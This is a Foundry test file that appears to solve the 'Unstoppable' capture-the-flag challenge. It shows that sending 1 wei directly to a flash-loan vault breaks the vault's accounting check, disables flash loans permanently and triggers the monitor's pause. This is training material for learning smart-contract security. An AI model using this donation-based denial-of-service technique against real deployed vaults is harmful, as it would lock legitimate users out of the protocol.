// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {UnstoppableVault} from "../src/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../src/UnstoppableMonitor.sol";

contract POC_Unstoppable_DoS is Test {
    address deployer;
    address player;
    
    uint256 constant TOKENS_IN_VAULT = 1_000_000 ether;
    uint256 constant INITIAL_PLAYER_BALANCE = 10 ether;
    uint256 constant ATTACK_AMOUNT = 1; // Just 1 wei
    
    DamnValuableToken token;
    UnstoppableVault vault;
    UnstoppableMonitor monitor;
    
    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");
        
        vm.startPrank(deployer);
        
        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer);
        
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);
        
        monitor = new UnstoppableMonitor(address(vault));
        
        token.transfer(player, INITIAL_PLAYER_BALANCE);
        
        vm.stopPrank();
    }
    
    function test_DoS_Via_Direct_Transfer() public {
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        
        console.log("Pre-attack vault balance:", token.balanceOf(address(vault)));
        console.log("Pre-attack totalSupply:", vault.totalSupply());
        
        vm.prank(player);
        token.transfer(address(vault), ATTACK_AMOUNT);
        
        console.log("Post-attack vault balance:", token.balanceOf(address(vault)));
        console.log("Post-attack totalSupply:", vault.totalSupply());
        
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT + ATTACK_AMOUNT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        
        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        vault.flashLoan(
            IERC3156FlashBorrower(address(0x1234)),
            address(token),
            100 ether,
            ""
        );
        
        console.log("Attack successful: flashLoan permanently disabled");
    }
    
    function test_Full_Exploit_Triggers_Monitor() public {
        vm.prank(player);
        token.transfer(address(vault), ATTACK_AMOUNT);
        
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitor.checkFlashLoan(100 ether);
        
        assertTrue(monitor.paused());
        console.log("Monitor emergency mode: ACTIVATED");
        console.log("Vault paused:", monitor.paused());
    }
    
    function test_Invariant_Violation() public view {
        uint256 sharesTotalSupply = vault.totalSupply();
        uint256 actualAssets = vault.totalAssets();
        
        console.log("Shares totalSupply:", sharesTotalSupply);
        console.log("totalAssets():", actualAssets);
        console.log("Equal?", sharesTotalSupply == actualAssets);
        
        assertEq(sharesTotalSupply, actualAssets);
    }
    
    function test_Invariant_Violation_After_Attack() public {
        vm.prank(player);
        token.transfer(address(vault), ATTACK_AMOUNT);
        
        uint256 sharesTotalSupply = vault.totalSupply();
        uint256 actualAssets = vault.totalAssets();
        
        console.log("Post-attack shares totalSupply:", sharesTotalSupply);
        console.log("Post-attack totalAssets():", actualAssets);
        
        assertLt(sharesTotalSupply, actualAssets);
        console.log("Invariant VIOLATED: assets > shares");
    }
}

interface IERC3156FlashBorrower {
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32);
}